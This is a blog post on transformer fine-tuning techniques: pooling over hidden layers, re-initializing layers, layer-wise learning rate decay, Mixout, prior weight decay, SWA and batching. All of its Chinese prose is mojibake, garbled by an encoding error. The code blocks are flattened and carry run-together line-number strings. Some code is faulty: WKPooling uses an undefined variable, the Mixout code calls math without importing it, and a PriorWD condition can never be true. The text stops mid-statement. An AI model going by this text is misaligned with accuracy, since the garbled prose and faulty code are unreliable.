QRåˆ†è§£ï¼Œç„¶è€Œpytorchåœ¨GPUä¸Šè®¡ç®—QRå¾ˆæ…¢ï¼Œæ‰€ä»¥è½¬åˆ°CPUä¸Šè®¡ç®—ï¼Œä½†æ˜¯è¿™ä¾ç„¶å¾ˆæ…¢ï¼ˆç›¸æ¯”äºå…¶ä»–åœ¨GPUä¸Šçš„æ“ä½œï¼‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192class WKPooling(nn.Module): def __init__(self, layer_start: int = 4, context_window_size: int = 2): super(WKPooling, self).__init__() self.layer_start = layer_start self.context_window_size = context_window_size def forward(self, all_hidden_states): ft_all_layers = all_hidden_states org_device = ft_all_layers.device all_layer_embedding = ft_all_layers.transpose(1,0) all_layer_embedding = all_layer_embedding[:, self.layer_start:, :, :] # Start from 4th layers output # torch.qr is slow on GPU (see https://github.com/pytorch/pytorch/issues/22573). So compute it on CPU until issue is fixed all_layer_embedding = all_layer_embedding.cpu() attention_mask = features['attention_mask'].cpu().numpy() unmask_num = np.array([sum(mask) for mask in attention_mask]) - 1 # Not considering the last item embedding = [] # One sentence at a time for sent_index in range(len(unmask_num)): sentence_feature = all_layer_embedding[sent_index, :, :unmask_num[sent_index], :] one_sentence_embedding = [] # Process each token for token_index in range(sentence_feature.shape[1]): token_feature = sentence_feature[:, token_index, :] # 'Unified Word Representation' token_embedding = self.unify_token(token_feature) one_sentence_embedding.append(token_embedding) ##features.update(&#123;'sentence_embedding': features['cls_token_embeddings']&#125;) one_sentence_embedding = torch.stack(one_sentence_embedding) sentence_embedding = self.unify_sentence(sentence_feature, one_sentence_embedding) embedding.append(sentence_embedding) output_vector = torch.stack(embedding).to(org_device) return output_vector def unify_token(self, token_feature): ## Unify Token Representation window_size = self.context_window_size alpha_alignment = torch.zeros(token_feature.size()[0], device=token_feature.device) alpha_novelty = torch.zeros(token_feature.size()[0], device=token_feature.device) for k in range(token_feature.size()[0]): left_window = token_feature[k - window_size:k, :] right_window = token_feature[k + 1:k + window_size + 1, :] window_matrix = torch.cat([left_window, right_window, token_feature[k, :][None, :]]) Q, R = torch.qr(window_matrix.T) r = R[:, -1] alpha_alignment[k] = torch.mean(self.norm_vector(R[:-1, :-1], dim=0), dim=1).matmul(R[:-1, -1]) / torch.norm(r[:-1]) alpha_alignment[k] = 1 / (alpha_alignment[k] * window_matrix.size()[0] * 2) alpha_novelty[k] = torch.abs(r[-1]) / torch.norm(r) # Sum Norm alpha_alignment = alpha_alignment / torch.sum(alpha_alignment) # Normalization Choice alpha_novelty = alpha_novelty / torch.sum(alpha_novelty) alpha = alpha_novelty + alpha_alignment alpha = alpha / torch.sum(alpha) # Normalize out_embedding = torch.mv(token_feature.t(), alpha) return out_embedding def norm_vector(self, vec, p=2, dim=0): ## Implements the normalize() function from sklearn vec_norm = torch.norm(vec, p=p, dim=dim) return vec.div(vec_norm.expand_as(vec)) def unify_sentence(self, sentence_feature, one_sentence_embedding): ## Unify Sentence By Token Importance sent_len = one_sentence_embedding.size()[0] var_token = torch.zeros(sent_len, device=one_sentence_embedding.device) for token_index in range(sent_len): token_feature = sentence_feature[:, token_index, :] sim_map = self.cosine_similarity_torch(token_feature) var_token[token_index] = torch.var(sim_map.diagonal(-1)) var_token = var_token / torch.sum(var_token) sentence_embedding = torch.mv(one_sentence_embedding.t(), var_token) return sentence_embedding def cosine_similarity_torch(self, x1, x2=None, eps=1e-8): x2 = x1 if x2 is None else x2 w1 = x1.norm(p=2, dim=1, keepdim=True) w2 = w1 if x2 is x1 else x2.norm(p=2, dim=1, keepdim=True) return torch.mm(x1, x2.t()) / (w1 * w2.t()).clamp(min=eps) 123pooler = WKPooling(layer_start=9)wkpooling_embeddings = pooler(all_hidden_states)logits = nn.Linear(config.hidden_size, 1)(wkpooling_embeddings) # regression head Other methods Dense Pooling Word Weight (TF-IDF) Pooling Async Pooling Parallel / Heirarchical Aggregation æ¯ä¸ªä»»åŠ¡ä¸Šï¼Œä¸åŒçš„æ–¹æ³•è¡¨ç°æœ‰å·®å¼‚ï¼Œåº”è¯¥æ ¹æ®æƒ…å†µé€‰æ‹©ä½¿ç”¨ä¸åŒçš„æ–¹æ³•ã€‚ Few-Shot Stability Fine-tuning Transformer modelsé€šå¸¸ä¸ç¨³å®šï¼Œæ”¶åˆ°è¶…å‚æ•°çš„å½±å“å¤§ï¼Œä¸åŒçš„ random seed ä¹Ÿä¼šå¯¼è‡´ä¸åŒçš„ç»“æœã€‚ æ¯”å¦‚ï¼Œåœ¨è®­ç»ƒæ—¶ï¼Œæ¯ä¸ªepochä¸­å¤šè¿›è¡Œevaluatingï¼Œè€Œä¸æ˜¯åœ¨æ¯ä¸ªepochä¹‹åevaluatingï¼Œèƒ½å¤Ÿå¢åŠ stabilityã€‚ å…¶ä»–æ–¹æ³•æœ‰ï¼š Debiasing Omission In BertADAM Re-Initializing Transformer Layers Utilizing Intermediate Layers Layer-wise Learning Rate Decay (LLRD) Mixout Regularization Pre-trained Weight Decay Stochastic Weight Averaging é€šå¸¸ä¸ä¼šä¸€èµ·ç”¨ï¼Œå¯èƒ½ä¼šäº’å‘å½±å“ã€‚æ–¹æ³•å„è‡ªæå‡ºçš„ç¯å¢ƒä¹Ÿä¸åŒã€‚æ‰€ä»¥ä¸€èˆ¬ä¸€ä¸¤ç§æ–¹æ³•çš„ä½¿ç”¨ï¼Œèƒ½å¤Ÿæé«˜æ¨¡å‹æ€§èƒ½ã€‚ Debiasing Omission In BERTAdam 1234rescaled_grad = clip(grad * rescale_grad, clip_gradient)m = beta1 * m + (1 - beta1) * rescaled_gradv = beta2 * v + (1 - beta2) * (rescaled_grad**2)w = w - learning_rate * (m / (sqrt(v) + epsilon) + wd * w) å’Œæ ‡å‡†Adamï¼Œå·®åˆ«åœ¨äº wd * wï¼Œå¢åŠ äº† weight decayã€‚è®ºæ–‡ Fixing Weight Decay Regularization in Adam ä¸­æå‡ºçš„ AdamWï¼Œä¿ç•™äº† bias-correction terms ï¼ˆä¸Šé¢ä¼ªä»£ç ç¬¬2ï¼Œ3è¡Œï¼‰ï¼Œå¹¶ä¸”å°† wd * w åŠ å…¥ learning_rate çš„å½±å“ã€‚å°†ä¸‹å›¾ä¸­çš„ç´«è‰² weight decay æ–¹æ³•ï¼Œæ”¹ä¸ºç»¿è‰²çš„éƒ¨åˆ†ã€‚è¿™æ ·æ›´æ–° x æ—¶ï¼Œweight decay ä¸ä¼šè€¦åˆå‚æ•° \\(\\beta\\) å’Œ \\(w_t\\)ï¼ˆç¬¬7ã€8è¡Œï¼‰ï¼Œè€Œæ˜¯ç›´æ¥ä½œç”¨äº xï¼ˆç¬¬12è¡Œï¼‰ã€‚ Debiasing Omissionå°±æ˜¯è¦ä¿ç•™ bias-correction terms ã€‚åœ¨HuggingFace Transformers AdamWä¸­è®¾ç½® correct_bias parameter ä¸º True ï¼ˆdefaultï¼‰ã€‚ 1234567891011121314151617181920lr = 2e-5epsilon = 1e-6weight_decay = 0.01no_decay = [\"bias\", \"LayerNorm.weight\"]optimizer_grouped_parameters = [&#123; \"params\": [p for n, p in model.named_parameters() if not any(nd in n for nd in no_decay)], \"weight_decay\": weight_decay, \"lr\": lr&#125;, &#123;\"params\": [p for n, p in model.named_parameters() if any(nd in n for nd in no_decay)], \"weight_decay\": 0.0, \"lr\": lr&#125;]optimizer = AdamW( optimizer_grouped_parameters, lr=lr, eps=epsilon, correct_bias=True) Reinitializing Transformer Layers æ¥è‡ªè®¡ç®—æœºè§†è§‰çš„ç›´è§‰ï¼Œé«˜å±‚ä¸é¢„è®­ç»ƒä»»åŠ¡ç›¸å…³çš„å±‚ï¼Œå¯ä»¥é‡æ–°è®­ç»ƒã€‚ æ¯”å¦‚ï¼ŒReinitialize Pooler layerçš„å‚æ•° 12345678910111213141516171819202122232425add_pooler = Truereinit_pooler = Trueclass Net(nn.Module): def __init__(self, config, _pretrained_model, add_pooler): super(Net, self).__init__() self.roberta = RobertaModel.from_pretrained(_pretrained_model, add_pooling_layer=add_pooler) self.classifier = RobertaClassificationHead(config) def forward(self, input_ids, attention_mask): outputs = self.roberta(input_ids, attention_mask=attention_mask,) sequence_output = outputs[0] logits = self.classifier(sequence_output) return logits model = Net(config, _pretrained_model, add_pooler)if reinit_pooler: print('Reinitializing Pooler Layer ...') encoder_temp = getattr(model, _model_type) encoder_temp.pooler.dense.weight.data.normal_(mean=0.0, std=encoder_temp.config.initializer_range) encoder_temp.pooler.dense.bias.data.zero_() for p in encoder_temp.pooler.parameters(): p.requires_grad = True print('Done.!') å¯¹ RoBERTa çš„transformer layerè¿›è¡Œ Reinitialize ã€‚ RoBERTa ä¸åŒäº BERT åœ¨äºï¼š æ²¡æœ‰ next-sentence pretraining objective ï¼Œæ›´æ”¹äº†è¶…å‚ï¼Œæ›´å¤§çš„ batch size å’Œlearning rate ä½¿ç”¨ byte level BPE çš„ tokenizer æ²¡æœ‰ token_type_idsï¼Œåªéœ€è¦ ç”¨ sep_token åˆ†å¼€ä¸åŒ sentenceã€‚ æ£€æŸ¥æ˜¯å¦è¢«åˆå§‹åŒ–ï¼š 1234for layer in model.roberta.encoder.layer[-reinit_layers:]: for module in layer.modules(): if isinstance(module, nn.Linear): print(module.weight.data) é‡æ–°åˆå§‹åŒ– 12345678910111213141516171819reinit_layers = 2# TF version uses truncated_normal for initialization. This is Pytorchif reinit_layers &gt; 0: print(f'Reinitializing Last &#123;reinit_layers&#125; Layers ...') encoder_temp = getattr(model, _model_type) for layer in encoder_temp.encoder.layer[-reinit_layers:]: for module in layer.modules(): if isinstance(module, nn.Linear): module.weight.data.normal_(mean=0.0, std=config.initializer_range) if module.bias is not None: module.bias.data.zero_() elif isinstance(module, nn.Embedding): module.weight.data.normal_(mean=0.0, std=config.initializer_range) if module.padding_idx is not None: module.weight.data[module.padding_idx].zero_() elif isinstance(module, nn.LayerNorm): module.bias.data.zero_() module.weight.data.fill_(1.0) print('Done.!') å¦å¤– XLNet å®ç°æ–¹å¼æœ‰äº›ä¸åŒ ï¼ˆTransformer-XLï¼‰ï¼š 123456789101112131415161718192021222324252627reinit_layers = 2if reinit_layers &gt; 0: print(f'Reinitializing Last &#123;reinit_layers&#125; Layers ...') for layer in model.transformer.layer[-reinit_layers :]: for module in layer.modules(): if isinstance(module, (nn.Linear, nn.Embedding)): module.weight.data.normal_(mean=0.0, std=model.transformer.config.initializer_range) if isinstance(module, nn.Linear) and module.bias is not None: module.bias.data.zero_() elif isinstance(module, nn.LayerNorm): module.bias.data.zero_() module.weight.data.fill_(1.0) elif isinstance(module, XLNetRelativeAttention): for param in [ module.q, module.k, module.v, module.o, module.r, module.r_r_bias, module.r_s_bias, module.r_w_bias, module.seg_embed, ]: param.data.normal_(mean=0.0, std=model.transformer.config.initializer_range) print('Done.!') BARTï¼Œæ˜¯ seq2seqçš„ç»“æ„ï¼Œ\"BERT\"ä½œä¸ºencoderï¼Œ\"GPT\"ä½œä¸ºdecoderï¼ˆleft-to-rightï¼‰ã€‚é‡‡ç”¨äº†å¤šæ ·çš„å™ªå£°é¢„è®­ç»ƒæ–¹å¼ã€‚ éšæœºtoken masking éšæœºtoken deletion éšæœºè¿ç»­tokensæ›¿æ¢ä¸ºä¸€ä¸ªmaskï¼Œæˆ–è€…ç›´æ¥æ’å…¥ä¸€ä¸ªmask éšæœºæ‰“ä¹±æ–‡æœ¬sentenceé¡ºåº å°†æ–‡æœ¬åºåˆ—è¿æˆç¯ï¼Œéšæœºé€‰æ‹©æ–‡æœ¬å¼€å§‹ä½ç½® BARTæ–‡æœ¬ç†è§£ä»»åŠ¡æ•ˆæœå¯ä»¥æŒå¹³RoBERTaï¼Œä¸”é€‚åˆæ–‡æœ¬ç”Ÿæˆä»»åŠ¡ï¼Œè€Œæ¨¡å‹å¤§å°ä»…ä»…æ¯”BERTå¤§10%ã€‚ 12345678910111213reinit_layers = 2_model_type = 'bart'_pretrained_model = 'facebook/bart-base'config = AutoConfig.from_pretrained(_pretrained_model)config.update(&#123;'num_labels':1&#125;)model = AutoModelForSequenceClassification.from_pretrained(_pretrained_model)if reinit_layers &gt; 0: print(f'Reinitializing Last &#123;reinit_layers&#125; Layers ...') for layer in model.model.decoder.layers[-reinit_layers :]: for module in layer.modules(): model.model._init_weights(module) print('Done.!') å®éªŒè¡¨æ˜ï¼Œ Re-initialization å¯¹ random seed æ›´ robustã€‚ä¸å»ºè®®åˆå§‹åŒ–è¶…è¿‡6å±‚çš„layerï¼Œä¸åŒä»»åŠ¡éœ€è¦å®éªŒæ‰¾åˆ°æœ€å¥½çš„å‚æ•°ã€‚ Utilizing Intermediate Layers æ­¤éƒ¨åˆ†å°±æ˜¯æœ¬æ–‡ç¬¬ä¸€èŠ‚ Transformer Representations çš„å†…å®¹ã€‚ LLRD - Layerwise Learning Rate Decay å°±æ˜¯ low layer é€šç”¨ä¿¡æ¯ï¼Œä½å­¦ä¹ ç‡ï¼Œtop layer ä»»åŠ¡ç›¸å…³ä¿¡æ¯ï¼Œç›¸å¯¹è¾ƒé«˜å­¦ä¹ ç‡ã€‚ ä¸€ç§æ–¹æ³•æ˜¯ï¼Œæ¯å±‚æœ‰ä¸€ä¸ª decay rate 12345678910111213141516171819202122232425262728293031323334353637def get_optimizer_grouped_parameters( model, model_type, learning_rate, weight_decay, layerwise_learning_rate_decay): no_decay = [\"bias\", \"LayerNorm.weight\"] # initialize lr for task specific layer optimizer_grouped_parameters = [ &#123; \"params\": [p for n, p in model.named_parameters() if \"classifier\" in n or \"pooler\" in n], \"weight_decay\": 0.0, \"lr\": learning_rate, &#125;, ] # initialize lrs for every layer num_layers = model.config.num_hidden_layers layers = [getattr(model, model_type).embeddings] + list(getattr(model, model_type).encoder.layer) layers.reverse() lr = learning_rate for layer in layers: lr *= layerwise_learning_rate_decay optimizer_grouped_parameters += [ &#123; \"params\": [p for n, p in layer.named_parameters() if not any(nd in n for nd in no_decay)], \"weight_decay\": weight_decay, \"lr\": lr, &#125;, &#123; \"params\": [p for n, p in layer.named_parameters() if any(nd in n for nd in no_decay)], \"weight_decay\": 0.0, \"lr\": lr, &#125;, ] return optimizer_grouped_parameters å…¶ä»–æ–¹æ³• è§ ç¬¬ä¸‰èŠ‚ Training Strategies çš„ Differential / Discriminative Learning Rate éƒ¨åˆ†ã€‚ Mixout Regularization ä¸åŒäº Dropout å°†ç¥ç»å…ƒä»¥æ¦‚ç‡pä¸¢å¼ƒï¼ŒMixout æ˜¯å°†ç¥ç»å…ƒå‚æ•°ä»¥æ¦‚ç‡ p æ›¿æ¢ä¸ºé¢„è®­ç»ƒæ¨¡å‹çš„å‚æ•°ã€‚æ„æ€å°±æ˜¯æœ‰ä¸¤ç»„å‚æ•°ï¼Œä¸€ç»„æ¥è‡ªé¢„è®­ç»ƒå¥½çš„æ¨¡å‹ï¼Œå¦ä¸€ç»„ä¸ºå½“å‰è®­ç»ƒçš„å‚æ•°ã€‚ å¦‚å›¾ï¼Œæ›¿æ¢ä¸ºçº¢è‰²æ¨¡å‹çš„å‚æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# https://github.com/bloodwass/mixoutimport torchimport torch.nn as nnimport torch.nn.init as initimport torch.nn.functional as Ffrom torch.nn import Parameterfrom torch.autograd.function import InplaceFunctionclass Mixout(InplaceFunction): @staticmethod def _make_noise(input): return input.new().resize_as_(input) @classmethod def forward(cls, ctx, input, target=None, p=0.0, training=False, inplace=False): if p &lt; 0 or p &gt; 1: raise ValueError(\"A mix probability of mixout has to be between 0 and 1,\" \" but got &#123;&#125;\".format(p)) if target is not None and input.size() != target.size(): raise ValueError( \"A target tensor size must match with a input tensor size &#123;&#125;,\" \" but got &#123;&#125;\".format(input.size(), target.size()) ) ctx.p = p ctx.training = training if ctx.p == 0 or not ctx.training: return input if target is None: target = cls._make_noise(input) target.fill_(0) target = target.to(input.device) if inplace: ctx.mark_dirty(input) output = input else: output = input.clone() ctx.noise = cls._make_noise(input) if len(ctx.noise.size()) == 1: ctx.noise.bernoulli_(1 - ctx.p) else: ctx.noise[0].bernoulli_(1 - ctx.p) ctx.noise = ctx.noise[0].repeat(input.size()[0], 1) ctx.noise.expand_as(input) if ctx.p == 1: output = target else: output = ((1 - ctx.noise) * target + ctx.noise * output - ctx.p * target) / (1 - ctx.p) return output @staticmethod def backward(ctx, grad_output): if ctx.p &gt; 0 and ctx.training: return grad_output * ctx.noise, None, None, None, None else: return grad_output, None, None, None, Nonedef mixout(input, target=None, p=0.0, training=False, inplace=False): return Mixout.apply(input, target, p, training, inplace)class MixLinear(torch.nn.Module): __constants__ = [\"bias\", \"in_features\", \"out_features\"] # for jit optimization def __init__(self, in_features, out_features, bias=True, target=None, p=0.0): super(MixLinear, self).__init__() self.in_features = in_features self.out_features = out_features self.weight = Parameter(torch.Tensor(out_features, in_features)) if bias: self.bias = Parameter(torch.Tensor(out_features)) else: self.register_parameter(\"bias\", None) self.reset_parameters() self.target = target self.p = p def reset_parameters(self): init.kaiming_uniform_(self.weight, a=math.sqrt(5)) if self.bias is not None: fan_in, _ = init._calculate_fan_in_and_fan_out(self.weight) bound = 1 / math.sqrt(fan_in) init.uniform_(self.bias, -bound, bound) def forward(self, input): return F.linear(input, mixout(self.weight, self.target, self.p, self.training), self.bias) def extra_repr(self): type = \"drop\" if self.target is None else \"mix\" return \"&#123;&#125;=&#123;&#125;, in_features=&#123;&#125;, out_features=&#123;&#125;, bias=&#123;&#125;\".format( type + \"out\", self.p, self.in_features, self.out_features, self.bias is not None ) ä½¿ç”¨ï¼š 123456789101112131415if mixout &gt; 0: print('Initializing Mixout Regularization') for sup_module in model.modules(): for name, module in sup_module.named_children(): if isinstance(module, nn.Dropout): module.p = 0.0 if isinstance(module, nn.Linear): target_state_dict = module.state_dict() bias = True if module.bias is not None else False new_module = MixLinear( module.in_features, module.out_features, bias, target_state_dict[\"weight\"], mixout ) new_module.load_state_dict(target_state_dict) setattr(sup_module, name, new_module) print('Done.!') Mixoutç›¸å½“äºä¸€ç§è‡ªé€‚åº”çš„ L2-regularizer ï¼Œä½¿å¾—å‚æ•°å˜åŒ–ä¸ä¼šå¾ˆå‰§çƒˆã€‚èƒ½å¤Ÿæé«˜finetuningç¨³å®šæ€§ã€‚ Pre-trained Weight Decay å°† weight decay ä¸­ï¼Œgradientå‡å»çš„ \\(\\lambda w\\) å˜ä¸º \\(\\lambda (w - w^{pretrained})\\)ã€‚åœ¨Mixoutæ–‡ç« ä¸­ï¼Œå®éªŒè¡¨æ˜è¿™æ ·æ¯”æ™®é€šçš„ weight decay ï¼Œfinetuningæ›´ç¨³å®šã€‚ 123456789101112131415161718192021222324252627282930313233343536class PriorWD(Optimizer): def __init__(self, optim, use_prior_wd=False, exclude_last_group=True): super(PriorWD, self).__init__(optim.param_groups, optim.defaults) self.param_groups = optim.param_groups self.optim = optim self.use_prior_wd = use_prior_wd self.exclude_last_group = exclude_last_group self.weight_decay_by_group = [] for i, group in enumerate(self.param_groups): self.weight_decay_by_group.append(group[\"weight_decay\"]) group[\"weight_decay\"] = 0 # w pretrained self.prior_params = &#123;&#125; for i, group in enumerate(self.param_groups): for p in group[\"params\"]: self.prior_params[id(p)] = p.detach().clone() def step(self, closure=None): if self.use_prior_wd: for i, group in enumerate(self.param_groups): for p in group[\"params\"]: if self.exclude_last_group and i == len(self.param_groups): p.data.add_(-group[\"lr\"] * self.weight_decay_by_group[i], p.data) else: # w - w pretrained p.data.add_( -group[\"lr\"] * self.weight_decay_by_group[i], p.data - self.prior_params[id(p)], ) loss = self.optim.step(closure) return loss def compute_distance_to_prior(self, param): assert id(param) in self.prior_params, \"parameter not in PriorWD optimizer\" return (param.data - self.prior_params[id(param)]).pow(2).sum().sqrt() ä½¿ç”¨: 12345678910optimizer_grouped_parameters = get_optimizer_grouped_parameters(model, learning_rate, weight_decay)optimizer = AdamW( optimizer_grouped_parameters, lr=learning_rate, eps=adam_epsilon, correct_bias=not use_bertadam)# ä¿®æ”¹ optimizeroptimizer = PriorWD(optimizer, use_prior_wd=use_prior_wd) Training Strategies æå‡æ¨¡å‹é€Ÿåº¦æˆ–å‡†ç¡®æ€§çš„æ–¹æ³•ï¼š Stochastic Weight Averaging MADGRAD Optimizer Differential / Discriminative Learning Rate Dynamic Padding and Uniform Length Batching Gradient Accumulation Freeze Embedding Numeric Precision Reduction Gradient Checkpointing Stochastic Weight Averaging learning rate scheduleç»è¿‡è®¾è®¡ï¼Œä½¿å¾—æ¨¡å‹åœ¨â€œæœ€ä¼˜è§£â€é™„è¿‘å¾˜å¾Šï¼Œè€Œä¸æ˜¯æ”¶æ•›åˆ°ä¸€ç‚¹ï¼ˆç†è®ºä¸Šï¼‰ã€‚æ¯”å¦‚75%çš„æ—¶é—´ä½¿ç”¨standard decaying learning rate strategy ï¼›è€Œå‰©ä¸‹çš„è®­ç»ƒåœ¨ä¸€ä¸ªç›¸å¯¹è¾ƒé«˜çš„constant learning rateä¸Šè®­ç»ƒã€‚ è®¡ç®—è®­ç»ƒæœ€åé˜¶æ®µçš„æ»‘åŠ¨å¹³å‡ä½œä¸ºSWAçš„æƒé‡ SWAæƒé‡åœ¨è®­ç»ƒæ—¶ï¼Œä¸å‚ä¸è®¡ç®—ã€‚è®¡ç®—Batch Normalizationçš„activation statisticsæ—¶ï¼Œåœ¨è®­ç»ƒç»“æŸåï¼Œå•ç‹¬è¿›è¡Œä¸€æ¬¡ forward pass å¾—åˆ°activation statisticsã€‚ æ‰€ä»¥ï¼Œæœ‰ä¸¤ç»„æƒé‡ï¼Œä¸€ç»„è®­ç»ƒBPï¼Œä¸€ç»„è®¡ç®—ä¿å­˜SWAæƒé‡ã€‚ ç¤ºä¾‹ 123456789101112131415161718192021222324from torch.optim.swa_utils import AveragedModel, SWALRfrom torch.optim.lr_scheduler import CosineAnnealingLRloader, optimizer, model, loss_fn = ...swa_start = 5swa_model = AveragedModel(model)swa_scheduler = SWALR(optimizer, swa_lr=0.05)scheduler = CosineAnnealingLR(optimizer, T_max=100)for epoch in range(100): for input, target in loader: optimizer.zero_grad() loss_fn(model(input), target).backward() optimizer.step() if epoch &gt; swa_start: swa_model.update_parameters(model) swa_scheduler.step() else: scheduler.step()# Update bn statistics for the swa_model at the endtorch.optim.swa_utils.update_bn(loader, swa_model)# Use swa_model to make predictions on test data preds = swa_model(test_input) refernce MADGRAD Optimizer AdaGradæ´¾ç”Ÿå‡ºçš„æ–°ä¼˜åŒ–å™¨ï¼Œåœ¨ä»¥ä¸‹ä»»åŠ¡ä¸­è¡¨ç°è¾ƒå¥½ï¼ŒåŒ…æ‹¬è§†è§‰ä¸­çš„åˆ†ç±»å’Œå›¾åƒåˆ°å›¾åƒçš„ä»»åŠ¡ï¼Œä»¥åŠè‡ªç„¶è¯­è¨€å¤„ç†ä¸­çš„å¾ªç¯å’ŒåŒå‘æ©è”½æ¨¡å‹ã€‚ ä½†æ˜¯ï¼Œweight decayä¸åŒäºå…¶ä»–ï¼Œå¸¸å¸¸è®¾ç½®ä¸º0ã€‚ learning rate çš„è®¾ç½®ä¹Ÿå’ŒSGDä¸Adamä¸åŒï¼Œå¿…è¦æ—¶ï¼Œå…ˆè¿›è¡Œä¸€æ¬¡learning rateæŸ¥æ‰¾ã€‚ paper 1pip -q install madgrad å¦å¤–å°æ•°æ®é›†ä¸Šçš„è®­ç»ƒï¼Œå¯ä»¥å°è¯•ä½¿ç”¨RAdam + Lookaheadè€Œä¸æ˜¯AdamWï¼Œæ•ˆæœå¯èƒ½ä¼šæ›´å¥½ï¼Œå› ä¸ºAdamWçš„warm-upé˜¶æ®µå—åˆ°æ•°æ®é›†å¤§å°sizeçš„å½±å“ã€‚ Differential / Discriminative Learning Rate æ¨¡å‹åº•å±‚ä¸ºæ™®éçš„å­—è¯ä¿¡æ¯ï¼Œè¶Šå¾€ä¸Šå¾—åˆ°ä¸ä»»åŠ¡ç›¸å…³çš„æŠ½è±¡ä¿¡æ¯ã€‚æ‰€ä»¥ fine-tune æ—¶ï¼Œå¯¹é€šç”¨å±‚è®¾ç½®è¾ƒå°å­¦ä¹ ç‡ï¼Œè¶Šå¾€ä¸Šå­¦ä¹ ç‡ç›¸å¯¹æ›´å¤§ã€‚è‡ªå®šä¹‰å±‚å­¦ä¹ ç‡å•ç‹¬è®¾ç½®ï¼Œä¸€èˆ¬è¾ƒå¤§ã€‚ 12345678910111213141516171819202122232425262728293031323334def get_optimizer_params(model, type='unified'): # differential learning rate and weight decay param_optimizer = list(model.named_parameters()) learning_rate = 5e-5 no_decay = ['bias', 'gamma', 'beta'] if type == 'unified': optimizer_parameters = filter(lambda x: x.requires_grad, model.parameters()) elif type == 'module_wise': optimizer_parameters = [ &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay)], 'weight_decay_rate': 0.01&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay)], 'weight_decay_rate': 0.0&#125;, &#123;'params': [p for n, p in model.named_parameters() if \"roberta\" not in n], 'lr': 1e-3, 'weight_decay_rate':0.01&#125; ] elif type == 'layer_wise': group1=['layer.0.','layer.1.','layer.2.','layer.3.'] group2=['layer.4.','layer.5.','layer.6.','layer.7.'] group3=['layer.8.','layer.9.','layer.10.','layer.11.'] group_all=['layer.0.','layer.1.','layer.2.','layer.3.','layer.4.','layer.5.','layer.6.','layer.7.','layer.8.','layer.9.','layer.10.','layer.11.'] optimizer_parameters = [ &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and not any(nd in n for nd in group_all)],'weight_decay_rate': 0.01&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and any(nd in n for nd in group1)],'weight_decay_rate': 0.01, 'lr': learning_rate/2.6&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and any(nd in n for nd in group2)],'weight_decay_rate': 0.01, 'lr': learning_rate&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and any(nd in n for nd in group3)],'weight_decay_rate': 0.01, 'lr': learning_rate*2.6&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and not any(nd in n for nd in group_all)],'weight_decay_rate': 0.0&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and any(nd in n for nd in group1)],'weight_decay_rate': 0.0, 'lr': learning_rate/2.6&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and any(nd in n for nd in group2)],'weight_decay_rate': 0.0, 'lr': learning_rate&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and any(nd in n for nd in group3)],'weight_decay_rate': 0.0, 'lr': learning_rate*2.6&#125;, &#123;'params': [p for n, p in model.named_parameters() if \"roberta\" not in n], 'lr':1e-3, \"momentum\" : 0.99&#125;, ] return optimizer_parameters Strategies: å¯¹äºå°æ•°æ®é›†ï¼Œå¤æ‚çš„learning rate scheduling strategiesï¼ˆlinear with warmup or cosine with warmup etc.ï¼‰åœ¨é¢„è®­ç»ƒå’Œfinetuningé˜¶æ®µéƒ½æ²¡ä»€ä¹ˆæ•ˆæœã€‚å°æ•°æ®é›†ï¼Œä½¿ç”¨ç®€å•çš„scheduling strategieså°±è¡Œã€‚ 12345678from transformers import ( get_constant_schedule, get_constant_schedule_with_warmup, get_cosine_schedule_with_warmup, get_cosine_with_hard_restarts_schedule_with_warmup, get_linear_schedule_with_warmup, get_polynomial_decay_schedule_with_warmup) Interpreting Transformers with LIT transfomerå¯è§†åŒ–å·¥å…· Paper: The Language Interpretability Tool: Extensible, Interactive Visualizations and Analysis for NLP Models Blog: The Language Interpretability Tool (LIT): Interactive Exploration and Analysis of NLP Models Official Page: Language Interpretability Tool Examples: GitHub Dynamic Padding and Uniform Length Batching å¸¸è§„paddingç­–ç•¥å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œpadåˆ°æœ€å¤§é•¿åº¦ã€‚ Dynamic Paddingå°±æ˜¯æ¯ä¸ªbatchï¼Œåˆ†åˆ«padåˆ°è¯¥batchä¸­æœ€é•¿çš„åºåˆ—é•¿åº¦ã€‚ è€ŒUniform Length Batchingï¼Œåˆ™æ˜¯å°†é•¿åº¦ç›¸è¿‘çš„åºåˆ—ç»„åˆæˆä¸€ä¸ªbatchã€‚ ç¤ºä¾‹ç¨‹åº 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126import randomimport numpy as npimport multiprocessingimport more_itertoolsimport torchimport torch.nn as nnfrom torch.utils.data import Sampler, Dataset, DataLoaderclass SmartBatchingDataset(Dataset): â€œtokenizeå¹¶å¾—åˆ°dataloaderâ€ def __init__(self, df, tokenizer): super(SmartBatchingDataset, self).__init__() # è¿™é‡Œ df.excerpt è¡¨ç¤ºdataframeä¸­çš„æ–‡æœ¬æ‰€åœ¨åˆ—ï¼Œä½¿ç”¨æ—¶éœ€è¦æ›¿æ¢ self._data = ( f\"&#123;tokenizer.bos_token&#125; \" + df.excerpt + f\" &#123;tokenizer.eos_token&#125;\" ).apply(tokenizer.tokenize).apply(tokenizer.convert_tokens_to_ids).to_list() self._targets = None if 'target' in df.columns: self._targets = df.target.tolist() self.sampler = None def __len__(self): return len(self._data) def __getitem__(self, item): if self._targets is not None: return self._data[item], self._targets[item] else: return self._data[item] def get_dataloader(self, batch_size, max_len, pad_id): self.sampler = 